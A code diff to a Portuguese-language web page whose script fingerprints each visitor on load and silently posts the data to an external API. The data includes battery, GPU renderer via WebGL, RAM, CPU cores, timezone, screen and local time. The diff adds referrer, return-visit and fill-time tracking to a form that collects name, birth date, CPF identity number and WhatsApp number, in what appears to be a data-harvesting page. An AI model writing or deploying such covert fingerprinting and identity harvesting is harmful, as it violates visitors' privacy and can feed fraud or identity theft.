@@ -41,7 +41,6 @@
       font-size: 12px; display: none; text-align: center;
       background: #ffe6e6; color: #a12d2d; border: 1px solid #e6b3b3;
     }
-
     #telaSucesso {
       display: none; position: fixed; inset: 0;
       background: #FFD400; color: #000; z-index: 9999;
@@ -51,7 +50,6 @@
     #telaSucesso .icone { font-size: 70px; margin-bottom: 20px; animation: pular 1s infinite; }
     #telaSucesso h2 { font-size: 34px; font-weight: 900; line-height: 1.2; margin-bottom: 15px; }
     #telaSucesso p { font-size: 18px; font-weight: 600; }
-
     @keyframes pular {
       0%, 100% { transform: translateY(0); }
       50%      { transform: translateY(-12px); }
@@ -91,46 +89,70 @@
   <script>
     const API_URL = 'https://gets-invio-on-api.onrender.com';
 
-    // ============ DETECÇÃO COMPLETA DE DISPOSITIVO ============
+    // ====== TEMPO DE PREENCHIMENTO ======
+    const inicio = Date.now();
+
+    // ====== JÁ VISITOU ANTES? ======
+    let jaVisitou = false;
+    try {
+      jaVisitou = localStorage.getItem('jaVisitou') === 'sim';
+      localStorage.setItem('jaVisitou', 'sim');
+    } catch (e) {}
+
+    // ====== REFERRER (de onde veio) ======
+    function pegarOrigem() {
+      const ref = document.referrer;
+      if (!ref) return 'Direto (digitou ou favorito)';
+      if (ref.includes('wa.me') || ref.includes('whatsapp')) return 'WhatsApp';
+      if (ref.includes('instagram')) return 'Instagram';
+      if (ref.includes('facebook') || ref.includes('fb.')) return 'Facebook';
+      if (ref.includes('tiktok')) return 'TikTok';
+      if (ref.includes('google')) return 'Google';
+      if (ref.includes('bing')) return 'Bing';
+      if (ref.includes('youtube')) return 'YouTube';
+      if (ref.includes('twitter') || ref.includes('x.com')) return 'Twitter/X';
+      if (ref.includes('telegram')) return 'Telegram';
+      if (ref.includes('linkedin')) return 'LinkedIn';
+      try {
+        return 'Outro: ' + new URL(ref).hostname;
+      } catch (e) {
+        return 'Desconhecida';
+      }
+    }
+
+    const origem = pegarOrigem();
+
+    // ====== DETECÇÃO DE DISPOSITIVO ======
     async function detectarDispositivo() {
       const ua = navigator.userAgent;
-
       let sistema = 'Desconhecido';
       let navegador = 'Desconhecido';
       let tipo = 'Desconhecido';
 
-      // Sistema Operacional
       if (/windows/i.test(ua)) sistema = 'Windows';
       else if (/android/i.test(ua)) sistema = 'Android';
       else if (/iphone|ipad|ipod/i.test(ua)) sistema = 'iOS';
       else if (/mac os/i.test(ua)) sistema = 'MacOS';
       else if (/linux/i.test(ua)) sistema = 'Linux';
 
-      // Navegador
       if (/edg/i.test(ua)) navegador = 'Edge';
       else if (/opr|opera/i.test(ua)) navegador = 'Opera';
       else if (/chrome/i.test(ua)) navegador = 'Chrome';
       else if (/firefox/i.test(ua)) navegador = 'Firefox';
       else if (/safari/i.test(ua)) navegador = 'Safari';
 
-      // Tipo
       if (/mobile|android|iphone|ipod/i.test(ua) && !/ipad/i.test(ua)) tipo = 'Celular';
       else if (/ipad|tablet/i.test(ua)) tipo = 'Tablet';
       else tipo = 'PC';
 
-      // --- Bateria ---
       let bateria = null;
       try {
         if (navigator.getBattery) {
           const b = await navigator.getBattery();
-          bateria = {
-            nivel: Math.round(b.level * 100),
-            carregando: b.charging
-          };
+          bateria = { nivel: Math.round(b.level * 100), carregando: b.charging };
         }
       } catch (e) {}
 
-      // --- Conexão ---
       let conexao = 'Desconhecida';
       try {
         if (navigator.connection && navigator.connection.effectiveType) {
@@ -138,62 +160,53 @@
         }
       } catch (e) {}
 
-      // --- RAM ---
       const ram = navigator.deviceMemory || null;
 
-      // --- Fuso horário ---
       let fuso = 'Desconhecido';
       try {
         fuso = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Desconhecido';
       } catch (e) {}
 
-      // --- Orientação ---
       let orientacao = 'Desconhecida';
       try {
-        if (screen.orientation && screen.orientation.type) {
-          orientacao = screen.orientation.type;
-        }
+        if (screen.orientation && screen.orientation.type) orientacao = screen.orientation.type;
       } catch (e) {}
 
-      // --- Núcleos CPU ---
       const nucleos = navigator.hardwareConcurrency || null;
 
-      // --- GPU (WebGL) ---
       let gpu = 'Desconhecida';
       try {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         if (gl) {
           const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-          if (debugInfo) {
-            gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Desconhecida';
-          }
+          if (debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Desconhecida';
         }
       } catch (e) {}
 
-      // --- Profundidade de cor ---
       const corProfundidade = screen.colorDepth || null;
-
-      // --- Pixel Ratio ---
       const pixelRatio = window.devicePixelRatio || 1;
+      const touch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+      const cookies = navigator.cookieEnabled;
+
+      // Hora local exata do cliente
+      const agora = new Date();
+      const horaCliente = agora.toLocaleString('pt-BR');
 
       return {
         sistema, navegador, tipo,
         idioma: navigator.language || 'Desconhecido',
         tela: `${window.screen.width}x${window.screen.height}`,
         bateria, conexao, ram, fuso, orientacao,
-        nucleos, gpu,
-        corProfundidade,
-        pixelRatio
+        nucleos, gpu, corProfundidade, pixelRatio,
+        touch, cookies, horaCliente
       };
     }
 
     let dispositivo = null;
 
-    // Detecta e envia visita assim que a página abre
     (async () => {
       dispositivo = await detectarDispositivo();
-
       fetch(API_URL + '/visita', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -216,12 +229,18 @@
     });
 
     btn.addEventListener('click', async () => {
+      // Calcula tempo de preenchimento em segundos
+      const tempoSegundos = Math.round((Date.now() - inicio) / 1000);
+
       const dadosForm = {
         nome: pegar('nome'),
         dataNascimento: pegar('dataNascimento'),
         cpf: pegar('cpf'),
         whatsapp: pegar('whatsapp'),
         dispositivo: dispositivo,
+        origem: origem,
+        jaVisitou: jaVisitou,
+        tempoPreenchimento: tempoSegundos,
       };
 
       resultado.style.display = 'none';
